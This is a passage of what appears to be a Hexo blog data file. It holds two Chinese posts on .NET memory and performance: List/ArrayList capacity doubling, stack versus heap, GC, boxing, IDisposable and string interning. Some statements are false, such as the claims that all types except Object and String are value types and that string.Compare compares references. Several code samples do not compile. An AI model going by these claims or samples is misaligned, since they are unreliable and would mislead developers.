 this._items[this._size] = value;\n    this._version++;\n    return this._size++;\n}\n/// <summary>\n/// 设置容量大小 默认容量为4,超出容量则扩容2倍\n/// </summary>\nprivate void EnsureCapacity(int min)\n{\n    if (this._items.Length < min)\n    {\n    \t//默认容量为4,超出容量则扩容2倍\n        int num = (this._items.Length == 0) ? 4 : (this._items.Length * 2);\n        if (num < min)\n        {\n            num = min;\n        }\n        this.Capacity = num;\n    }\n}\n/// <summary>\n/// 设置容量大小\n/// </summary>\npublic virtual int Capacity\n{\n    get\n    {\n        return this._items.Length;\n    }\n    set\n    {\n        if (value != this._items.Length)\n        {\n            if (value < this._size)\n            {\n                throw new ArgumentOutOfRangeException(\"value\", Environment.GetResourceString(\"ArgumentOutOfRange_SmallCapacity\"));\n            }\n            if (value > 0)\n            {\n                object[] array = new object[value];//重新分配内存\n                if (this._size > 0) \n                {\n                    Array.Copy(this._items, 0, array, 0, this._size); \n                }\n                this._items = array;\n                return; \n            } \n            this._items = new object[4]; \n        } \n    } \n}\n```\n\n测试\n\n``` CSharp\nList<int> list = new List<int>();//list.Capacity=0\nlist.Add(new int());//list.Capacity=4\nlist.Add(new int());//list.Capacity=4\nlist.Add(new int());//list.Capacity=4\nlist.Add(new int());//list.Capacity=4\nlist.Add(new int());//list.Capacity=8\n```\n\n## 总结\n* 无论是List,ArrayList或其它集合,不过是对Array的一层包装,也由此可以断定集合的性能肯定不如Array。\n* 集合的扩容过程增加CPU的损耗和GC的压力，对于问题的严重性就取决于实际应用的场合，如果在高并发的应用下存在大量这操作那问题就变得严重多了。\n* 使用:对集合初始化的时候指定容量,如果可以直接使用Array代替集合。","slug":"CSharp-2","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llsi0001g2x616cu4293","content":"<p>由于.net不会实时回收内存，那么.net对数组与集合是内存的是怎么处理的</p>\n<h2 id=\"数组与集合\"><a href=\"#数组与集合\" class=\"headerlink\" title=\"数组与集合\"></a>数组与集合</h2><p>大家都知道数组必须指定大小，而且大小一但指定就不能更改了，也就是说数组不能动态的增加容量，那么对于一些需要动态增加容量的需求是实现不了的。实现动态扩容的需求都是通过集合,如List,Dictionary,ArrayList.<br><a id=\"more\"></a></p>\n<h2 id=\"集合如何实现动态扩容\"><a href=\"#集合如何实现动态扩容\" class=\"headerlink\" title=\"集合如何实现动态扩容\"></a>集合如何实现动态扩容</h2><p>拿ArrayList和List为例,实际的代码大概如下:</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> 增加元素</span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">virtual</span> <span class=\"keyword\">int</span> <span class=\"title\">Add</span>(<span class=\"params\"><span class=\"keyword\">object</span> <span class=\"keyword\">value</span></span>)</span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//超出集合大小</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>._size == <span class=\"keyword\">this</span>._items.Length)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.EnsureCapacity(<span class=\"keyword\">this</span>._size + <span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>._items[<span class=\"keyword\">this</span>._size] = <span class=\"keyword\">value</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>._version++;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>._size++;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> 设置容量大小 默认容量为4,超出容量则扩容2倍</span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">EnsureCapacity</span>(<span class=\"params\"><span class=\"keyword\">int</span> min</span>)</span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>._items.Length &lt; min)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    \t<span class=\"comment\">//默认容量为4,超出容量则扩容2倍</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span> num = (<span class=\"keyword\">this</span>._items.Length == <span class=\"number\">0</span>) ? <span class=\"number\">4</span> : (<span class=\"keyword\">this</span>._items.Length * <span class=\"number\">2</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (num &lt; min)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            num = min;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.Capacity = num;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> 设置容量大小</span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">virtual</span> <span class=\"keyword\">int</span> Capacity</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">get</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>._items.Length;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">set</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">value</span> != <span class=\"keyword\">this</span>._items.Length)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"keyword\">value</span> &lt; <span class=\"keyword\">this</span>._size)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> ArgumentOutOfRangeException(<span class=\"string\">\"value\"</span>, Environment.GetResourceString(<span class=\"string\">\"ArgumentOutOfRange_SmallCapacity\"</span>));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"keyword\">value</span> &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"keyword\">object</span>[] array = <span class=\"keyword\">new</span> <span class=\"keyword\">object</span>[<span class=\"keyword\">value</span>];<span class=\"comment\">//重新分配内存</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>._size &gt; <span class=\"number\">0</span>) </span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    Array.Copy(<span class=\"keyword\">this</span>._items, <span class=\"number\">0</span>, array, <span class=\"number\">0</span>, <span class=\"keyword\">this</span>._size); </span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">this</span>._items = array;</span><br><span class=\"line\">                <span class=\"keyword\">return</span>; </span><br><span class=\"line\">            &#125; </span><br><span class=\"line\">            <span class=\"keyword\">this</span>._items = <span class=\"keyword\">new</span> <span class=\"keyword\">object</span>[<span class=\"number\">4</span>]; </span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>测试</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List&lt;<span class=\"keyword\">int</span>&gt; list = <span class=\"keyword\">new</span> List&lt;<span class=\"keyword\">int</span>&gt;();<span class=\"comment\">//list.Capacity=0</span></span><br><span class=\"line\">list.Add(<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>());<span class=\"comment\">//list.Capacity=4</span></span><br><span class=\"line\">list.Add(<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>());<span class=\"comment\">//list.Capacity=4</span></span><br><span class=\"line\">list.Add(<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>());<span class=\"comment\">//list.Capacity=4</span></span><br><span class=\"line\">list.Add(<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>());<span class=\"comment\">//list.Capacity=4</span></span><br><span class=\"line\">list.Add(<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>());<span class=\"comment\">//list.Capacity=8</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ul>\n<li>无论是List,ArrayList或其它集合,不过是对Array的一层包装,也由此可以断定集合的性能肯定不如Array。</li>\n<li>集合的扩容过程增加CPU的损耗和GC的压力，对于问题的严重性就取决于实际应用的场合，如果在高并发的应用下存在大量这操作那问题就变得严重多了。</li>\n<li>使用:对集合初始化的时候指定容量,如果可以直接使用Array代替集合。</li>\n</ul>\n","excerpt":"<p>由于.net不会实时回收内存，那么.net对数组与集合是内存的是怎么处理的</p>\n<h2 id=\"数组与集合\"><a href=\"#数组与集合\" class=\"headerlink\" title=\"数组与集合\"></a>数组与集合</h2><p>大家都知道数组必须指定大小，而且大小一但指定就不能更改了，也就是说数组不能动态的增加容量，那么对于一些需要动态增加容量的需求是实现不了的。实现动态扩容的需求都是通过集合,如List,Dictionary,ArrayList.<br>","more":"</p>\n<h2 id=\"集合如何实现动态扩容\"><a href=\"#集合如何实现动态扩容\" class=\"headerlink\" title=\"集合如何实现动态扩容\"></a>集合如何实现动态扩容</h2><p>拿ArrayList和List为例,实际的代码大概如下:</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> 增加元素</span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">virtual</span> <span class=\"keyword\">int</span> <span class=\"title\">Add</span>(<span class=\"params\"><span class=\"keyword\">object</span> <span class=\"keyword\">value</span></span>)</span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//超出集合大小</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>._size == <span class=\"keyword\">this</span>._items.Length)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.EnsureCapacity(<span class=\"keyword\">this</span>._size + <span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>._items[<span class=\"keyword\">this</span>._size] = <span class=\"keyword\">value</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>._version++;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>._size++;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> 设置容量大小 默认容量为4,超出容量则扩容2倍</span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">EnsureCapacity</span>(<span class=\"params\"><span class=\"keyword\">int</span> min</span>)</span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>._items.Length &lt; min)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    \t<span class=\"comment\">//默认容量为4,超出容量则扩容2倍</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span> num = (<span class=\"keyword\">this</span>._items.Length == <span class=\"number\">0</span>) ? <span class=\"number\">4</span> : (<span class=\"keyword\">this</span>._items.Length * <span class=\"number\">2</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (num &lt; min)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            num = min;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.Capacity = num;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> 设置容量大小</span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">virtual</span> <span class=\"keyword\">int</span> Capacity</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">get</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>._items.Length;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">set</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">value</span> != <span class=\"keyword\">this</span>._items.Length)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"keyword\">value</span> &lt; <span class=\"keyword\">this</span>._size)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> ArgumentOutOfRangeException(<span class=\"string\">\"value\"</span>, Environment.GetResourceString(<span class=\"string\">\"ArgumentOutOfRange_SmallCapacity\"</span>));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"keyword\">value</span> &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"keyword\">object</span>[] array = <span class=\"keyword\">new</span> <span class=\"keyword\">object</span>[<span class=\"keyword\">value</span>];<span class=\"comment\">//重新分配内存</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>._size &gt; <span class=\"number\">0</span>) </span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    Array.Copy(<span class=\"keyword\">this</span>._items, <span class=\"number\">0</span>, array, <span class=\"number\">0</span>, <span class=\"keyword\">this</span>._size); </span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">this</span>._items = array;</span><br><span class=\"line\">                <span class=\"keyword\">return</span>; </span><br><span class=\"line\">            &#125; </span><br><span class=\"line\">            <span class=\"keyword\">this</span>._items = <span class=\"keyword\">new</span> <span class=\"keyword\">object</span>[<span class=\"number\">4</span>]; </span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>测试</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List&lt;<span class=\"keyword\">int</span>&gt; list = <span class=\"keyword\">new</span> List&lt;<span class=\"keyword\">int</span>&gt;();<span class=\"comment\">//list.Capacity=0</span></span><br><span class=\"line\">list.Add(<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>());<span class=\"comment\">//list.Capacity=4</span></span><br><span class=\"line\">list.Add(<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>());<span class=\"comment\">//list.Capacity=4</span></span><br><span class=\"line\">list.Add(<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>());<span class=\"comment\">//list.Capacity=4</span></span><br><span class=\"line\">list.Add(<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>());<span class=\"comment\">//list.Capacity=4</span></span><br><span class=\"line\">list.Add(<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>());<span class=\"comment\">//list.Capacity=8</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ul>\n<li>无论是List,ArrayList或其它集合,不过是对Array的一层包装,也由此可以断定集合的性能肯定不如Array。</li>\n<li>集合的扩容过程增加CPU的损耗和GC的压力，对于问题的严重性就取决于实际应用的场合，如果在高并发的应用下存在大量这操作那问题就变得严重多了。</li>\n<li>使用:对集合初始化的时候指定容量,如果可以直接使用Array代替集合。</li>\n</ul>"},{"title":".net由内存模型说性能1","date":"2016-04-29T16:00:00.000Z","desc":"gc C# 性能优化","_content":".net不必手工管理内存，但要编写高性能的代码，就仍需理解后面发生的事情。\n\n## 内存模型:堆与栈\nC#内存主要有两类：Stack和Heap\nStack叫做栈区，由编译器自动分配释放，存放函数的参数值，局部变量的值等。\nHeap则称之为堆区，由开发人员申请内存，在垃圾回收器的控制下工作。\n![效果](/img/CSharp-1.jpg)\n\n<!-- more -->\n## 值类型与引用类型\n值类型的数据和内存在同一个位置，而引用类型是一个指向内存的指针。也就是对Stack和Heap的实际使用。\n![效果](/img/CSharp-2.jpg)\n![效果](/img/CSharp-3.jpg)\n除了Object和String,其它都是值类型。值类型的性能要略优于引用类型，它只需要一次访问内存就可拿到数据。\n\n## 装箱与拆箱\n值类型与引用类型进行类型转换时会产生装箱和拆箱操作。\n![效果](/img/CSharp-4.jpg)\n非必要时尽量避免这类操作，会对性能一定的影响。\n\n## 垃圾回收器GC\n垃圾回收器为什么不会立即回收对象?\n对象不再被引用时,如果立即删除,堆上的自由空间就会分散开来，给新对象分配内存就会很难处理,程序必须搜索整个堆才能找到一块足够大的内存块来存储整个新对象。\n整个heap中对象的引用关系错综复杂（交叉引用、循环引用），形成复杂的graph。heap对应有一个Roots，它能使程序在heap之外可以找到的各种入口点。root包括:全局对象、静态变量、局部对象、函数调用参数、当前CPU寄存器中的对象指针。\n下面可以通过一组图片来进一步了解GC的工作。黄色代表还在引用的对象，灰色代表没有引用的对象。\n现在内存使用已达到阀值,GC需要清理内存，下图就是GC整个清理的过程。\n![效果](/img/CSharp-5.gif)\n![效果](/img/CSharp-6.gif)\n![效果](/img/CSharp-7.gif)\n![效果](/img/CSharp-8.gif)\nGC回收内存是一种非常耗费性能的工作，减少不必要的内存使用有助于提高GC性能\n\n## 传参的优化\n如果我们要将一个非常大的值类型数据(如数据量大的struct类型)入栈，它会占用非常大的内存空间，而且会占有过多的处理器资源来进行拷贝复制。\n``` CSharp\npublic struct ConstNum\n{\n\tlong a,b,c,d,e,f,g,h,i,j,k;\n}\n\npublic  void Go()\n{\n\tConstNum x = new ConstNum();\n\tDo(x);\n}\n\npublic  void Do(ConstNum x)\n{\n\t//do something\n}\n```\n可以将struct改为class。实例对象之后则是引用类型。或使用ref关键字将方法改为Do(ref ConstNum x)，也可以达到引用类型的作用。\n\n## 静态\n有一个Dude类，你需要实例化多个对像使用。\n``` CSharp\nClass Dude\n{\n\tprivate _name =\"test\";\n\tpublic void SayHello()\n\t{\n\t\t//DoSomething\n\t}\n}\n```\n![效果](/img/CSharp-9.gif)\n你可以使用静态方法,以达到内存节省的目的。\n``` CSharp\nClass Dude\n{\n\tprivate _name =\"test\";\n\tpublic static void SayHello()\n\t{\n\t\t//DoSomething\n\t}\n}\n```\n![效果](/img/CSharp-10.gif)\n实际项目中使用单例模式来达到省内存的目的。\n\n## IDisposable与析构函数\n托管的资源只能由CG回收。而非托管的资源可以通过实现IDisposable进行释放。\n``` CSharp\npublic class CDisposable : IDisposable\n{\n    //析构函数，编译后变成 protected void Finalize()，GC会在回收对象前会调用调用该方法 \n    ~CDisposable() \n    { \n        Dispose(false); \n    } \n\n    //通过实现该接口，显式地释放对象，只针对非托管对象。\n    void Dispose() \n    { \n        Dispose(true); \n    } \n\n}\n```\n\nDispose调用\n\n``` CSharp\nUsing(MyClass myObj = new CDisposable())\n{ \n\t//DoSomething\n}\n```\n\n或者直接调myObj.Dispose();\n\n\n## 字符串的内存规则\nstring是引用类型，但string的值是不可变，但你改变string值的时候会对新值重新分配内存,老值仍驻留在内存中。\n\n```CSharp\nstring a = \"1234\";\na += \"5678\";\nConsole.ReadLine();\n```\n\n看起来我们似乎已经把a的值从“1234”改为了“12345678”，实际上并没有改变。因为string的值是无法修改不了了。堆中其实存在着两个字符串对象。字符串“1234”仍然在内存中驻留。\n\nstring容易引起内存驻留，但我们仍有办法减少内存使用。\n\n``` CSharp\nstring str1 = \"ABCD1234\";\nstring str2 = \"ABCD1234\";\nstring str3 = \"ABCD\" + \"1234\"; \nstring str4 = \"1234\";\nstring str5 = \"ABCD\" + str4;\nobject.ReferenceEquals(str1, str2) == True；\nobject.ReferenceEquals(str1, str3) == True；\nobject.ReferenceEquals(str1, str5) == False\n```\n通过上面比较，字符串都驻留在内存。尽量使用字符串相加来代替字符串变量和字符创相加，这样可以使用重复利用字符串驻留，减少内存使用。\n\n``` CSharp\nstring str3 = \"ABCD\" + \"1234\"; \n```\n\n对string作频繁的操作使用StringBuilder或string.format(也是StringBuilder实现)处理。\nStringBuilder内部维护一个字符数组，而不是一个string来避免string操作带来的新的string的创建。\n\n``` CSharp\nStringBuilder sb = new StringBuilder();\nsb.Append(str1);\nsb.Append(str2);\nsb.Append(str3);\n``` \n\n``` CSharp\nstring sb = string.format(\"{0}{1}{2}\",str1,str2,str3);\n``` \n\n相当于sb = str1 + str2 + str3;\n\n4.高效地进行string的比较操作\n对象之间的比较有比较Value和比较Reference之说。一般地对Reference进行比较的速度最快，因为只需要比较一下是不是同一地址就行了。\nobject.ReferenceEquals和string. Compare就是引用比较的方法。","source":"_posts/CSharp-1.md","raw":"---\ntitle: .net由内存模型说性能1\ndate: 2016-4-30\ndesc: gc C# 性能优化\n---\n.net不必手工管理内存，但要编写高性能的代码，就仍需理解后面发生的事情。\n\n## 内存模型:堆与栈\nC#内存主要有两类：Stack和Heap\nStack叫做栈区，由编译器自动分配释放，存放函数的参数值，局部变量的值等。\nHeap则称之为堆区，由开发人员申请内存，在垃圾回收器的控制下工作。\n![效果](/img/CSharp-1.jpg)\n\n<!-- more -->\n## 值类型与引用类型\n值类型的数据和内存在同一个位置，而引用类型是一个指向内存的指针。也就是对Stack和Heap的实际使用。\n![效果](/img/CSharp-2.jpg)\n![效果](/img/CSharp-3.jpg)\n除了Object和String,其它都是值类型。值类型的性能要略优于引用类型，它只需要一次访问内存就可拿到数据。\n\n## 装箱与拆箱\n值类型与引用类型进行类型转换时会产生装箱和拆箱操作。\n![效果](/img/CSharp-4.jpg)\n非必要时尽量避免这类操作，会对性能一定的影响。\n\n## 垃圾回收器GC\n垃圾回收器为什么不会立即回收对象?\n对象不再被引用时,如果立即删除,堆上的自由空间就会分散开来，给新对象分配内存就会很难处理,程序必须搜索整个堆才能找到一块足够大的内存块来存储整个新对象。\n整个heap中对象的引用关系错综复杂（交叉引用、循环引用），形成复杂的graph。heap对应有一个Roots，它能使程序在heap之外可以找到的各种入口点。root包括:全局对象、静态变量、局部对象、函数调用参数、当前CPU寄存器中的对象指针。\n下面可以通过一组图片来进一步了解GC的工作。黄色代表还在引用的对象，灰色代表没有引用的对象。\n现在内存使用已达到阀值,GC需要清理内存，下图就是GC整个清理的过程。\n![效果](/img/CSharp-5.gif)\n![效果](/img/CSharp-6.gif)\n![效果](/img/CSharp-7.gif)\n![效果](/img/CSharp-8.gif)\nGC回收内存是一种非常耗费性能的工作，减少不必要的内存使用有助于提高GC性能\n\n## 传参的优化\n如果我们要将一个非常大的值类型数据(如数据量大的struct类型)入栈，它会占用非常大的内存空间，而且会占有过多的处理器资源来进行拷贝复制。\n``` CSharp\npublic struct ConstNum\n{\n\tlong a,b,c,d,e,f,g,h,i,j,k;\n}\n\npublic  void Go()\n{\n\tConstNum x = new ConstNum();\n\tDo(x);\n}\n\npublic  void Do(ConstNum x)\n{\n\t//do something\n}\n```\n可以将struct改为class。实例对象之后则是引用类型。或使用ref关键字将方法改为Do(ref ConstNum x)，也可以达到引用类型的作用。\n\n## 静态\n有一个Dude类，你需要实例化多个对像使用。\n``` CSharp\nClass Dude\n{\n\tprivate _name =\"test\";\n\tpublic void SayHello()\n\t{\n\t\t//DoSomething\n\t}\n}\n```\n![效果](/img/CSharp-9.gif)\n你可以使用静态方法,以达到内存节省的目的。\n``` CSharp\nClass Dude\n{\n\tprivate _name =\"test\";\n\tpublic static void SayHello()\n\t{\n\t\t//DoSomething\n\t}\n}\n```\n![效果](/img/CSharp-10.gif)\n实际项目中使用单例模式来达到省内存的目的。\n\n## IDisposable与析构函数\n托管的资源只能由CG回收。而非托管的资源可以通过实现IDisposable进行释放。\n``` CSharp\npublic class CDisposable : IDisposable\n{\n    //析构函数，编译后变成 protected void Finalize()，GC会在回收对象前会调用调用该方法 \n    ~CDisposable() \n    { \n        Dispose(false); \n    } \n\n    //通过实现该接口，显式地释放对象，只针对非托管对象。\n    void Dispose() \n    { \n        Dispose(true); \n    } \n\n}\n```\n\nDispose调用\n\n``` CSharp\nUsing(MyClass myObj = new CDisposable())\n{ \n\t//DoSomething\n}\n```\n\n或者直接调myObj.Dispose();\n\n\n## 字符串的内存规则\nstring是引用类型，但string的值是不可变，但你改变string值的时候会对新值重新分配内存,老值仍驻留在内存中。\n\n```CSharp\nstring a = 